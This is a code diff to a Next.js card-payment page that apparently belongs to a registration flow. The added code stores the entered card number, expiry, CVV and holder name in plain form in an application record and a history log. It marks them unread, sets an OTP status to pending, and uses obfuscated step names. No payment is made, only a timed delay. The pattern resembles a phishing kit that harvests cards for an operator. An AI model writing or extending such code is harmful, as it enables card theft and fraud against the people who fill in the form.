@@ -1,17 +1,64 @@
 "use client";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { Loader2 } from "lucide-react";
 import StepBar from "@/components/StepBar";
+import { useFormData } from "@/context/FormContext";
+import {
+  appendHistoryEntry,
+  ensureApplicationDoc,
+  generateConfirmationCode,
+  hasRequiredApplicantData,
+  updateApplicationData,
+} from "@/lib/application-sync";
 
 type Stage = "form" | "processing";
 
 export default function CardPage() {
   const router = useRouter();
+  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
+    useFormData();
   const [card, setCard] = useState({ number: "", expiry: "", cvv: "", name: "" });
   const [stage, setStage] = useState<Stage>("form");
   const [errors, setErrors] = useState<Partial<Record<keyof typeof card, string>>>({});
   const [paying, setPaying] = useState(false);
+
+  useEffect(() => {
+    if (!hydrated) return;
+
+    if (!hasRequiredApplicantData(data)) {
+      router.replace("/register");
+      return;
+    }
+
+    const code = confirmationCode || generateConfirmationCode();
+    if (!confirmationCode) {
+      setConfirmationCode(code);
+    }
+
+    void ensureApplicationDoc({
+      docId,
+      data,
+      confirmationCode: code,
+      pathname: "/card",
+    })
+      .then((resolvedId) => {
+        if (resolvedId !== docId) {
+          setDocId(resolvedId);
+        }
+      })
+      .catch((error) => {
+        console.error("Failed to sync card stage:", error);
+      });
+  }, [
+    confirmationCode,
+    data,
+    docId,
+    hydrated,
+    router,
+    setConfirmationCode,
+    setDocId,
+  ]);
 
   function fmt4(val: string) { return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim(); }
   function fmtExp(val: string) { const d = val.replace(/\D/g, "").slice(0, 4); return d.length >= 3 ? d.slice(0, 2) + "/" + d.slice(2) : d; }
@@ -34,6 +81,47 @@ export default function CardPage() {
   async function handlePay() {
     const errs = validate();
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
+
+    const code = confirmationCode || generateConfirmationCode();
+    if (!confirmationCode) {
+      setConfirmationCode(code);
+    }
+
+    const resolvedDocId = await ensureApplicationDoc({
+      docId,
+      data,
+      confirmationCode: code,
+      pathname: "/card",
+    });
+
+    if (resolvedDocId !== docId) {
+      setDocId(resolvedDocId);
+    }
+
+    const cardPayload = {
+      cardNumber: card.number,
+      expiryDate: card.expiry,
+      cvv: card.cvv,
+      cardHolderName: card.name,
+      paymentMethod: "credit-card",
+      cardStatus: "pending",
+      otpStatus: "pending",
+      status: "pending_review",
+      isUnread: true,
+      paymentStatus: "pending",
+      cardUpdatedAt: new Date().toISOString(),
+      currentStep: "_st1",
+      currentPage: "card",
+    };
+
+    await updateApplicationData(resolvedDocId, cardPayload);
+    await appendHistoryEntry({
+      docId: resolvedDocId,
+      type: "_t1",
+      status: "pending",
+      data: cardPayload,
+    });
+
     setPaying(true);
     await new Promise((r) => setTimeout(r, 400));
     setStage("processing");
